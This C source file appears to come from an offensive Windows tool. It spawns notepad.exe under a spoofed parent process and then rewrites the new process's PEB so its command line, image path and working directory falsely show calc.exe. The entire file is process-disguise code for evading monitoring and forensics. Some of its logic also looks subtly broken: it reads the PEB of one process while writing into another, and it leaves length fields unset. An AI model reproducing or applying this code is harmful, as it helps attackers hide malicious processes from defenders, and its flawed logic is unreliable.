#include "main.h"
VOID spoofRemote(IN HANDLE hProcess, IN DWORD dwParentPid) {
	//PPID spoofing
	SIZE_T sAttrList = NULL;
	STARTUPINFOEXA siEx = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	RtlSecureZeroMemory(&siEx, sizeof(STARTUPINFOEXA));
	RtlSecureZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
	siEx.StartupInfo.cb = sizeof(STARTUPINFOEXA);
	HANDLE hParentProcess = OpenProcess(MAXIMUM_ALLOWED, FALSE, dwParentPid);
	InitializeProcThreadAttributeList(NULL, 1, NULL, &sAttrList);
	siEx.lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sAttrList);
	InitializeProcThreadAttributeList(siEx.lpAttributeList, 1, NULL, &sAttrList);
	UpdateProcThreadAttribute(siEx.lpAttributeList, NULL, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL);
	CreateProcessA(NULL, (LPSTR)"C:\\windows\\system32\\notepad.exe", NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &siEx.StartupInfo, &pi);

	// manipulate PEB
	PPEB pPeb = getPebWinapi(hProcess);

	const wchar_t spoof[] = L"C:\\Windows\\System32\\calc.exe";
	const wchar_t spoofDir[] = L"C:\\Windows\\System32	";
	USHORT spoodSize = wcslen(spoof) * sizeof(wchar_t);
	USHORT spoodDirSize = wcslen(spoofDir) * sizeof(wchar_t);
	//we have to store 'spoof' in target process address space to be able to use it
	LPVOID remoteCommandLine = VirtualAllocEx(pi.hProcess, NULL, spoodSize, MEM_COMMIT, PAGE_READWRITE);
	WriteProcessMemory(pi.hProcess, remoteCommandLine, spoof, spoodSize, NULL);
	WriteProcessMemory(pi.hProcess, (char*)pPeb->ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.Buffer), &remoteCommandLine, sizeof(LPVOID), NULL);
	WriteProcessMemory(pi.hProcess, (char*)pPeb->ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMETERS, ImagePathName.Buffer), &remoteCommandLine, sizeof(LPVOID), NULL);

	LPVOID remoteCurrentDirectory = VirtualAllocEx(pi.hProcess, NULL, spoodDirSize, MEM_COMMIT, PAGE_READWRITE);
	WriteProcessMemory(pi.hProcess, remoteCurrentDirectory, spoofDir, spoodDirSize, NULL);
	PCURDIR pCurDir = (PCURDIR)((PBYTE)pPeb->ProcessParameters + 0x038);
	WriteProcessMemory(pi.hProcess, (char*)pCurDir + offsetof(CURDIR, DosPath.Buffer), &remoteCurrentDirectory, sizeof(LPVOID), NULL);

}
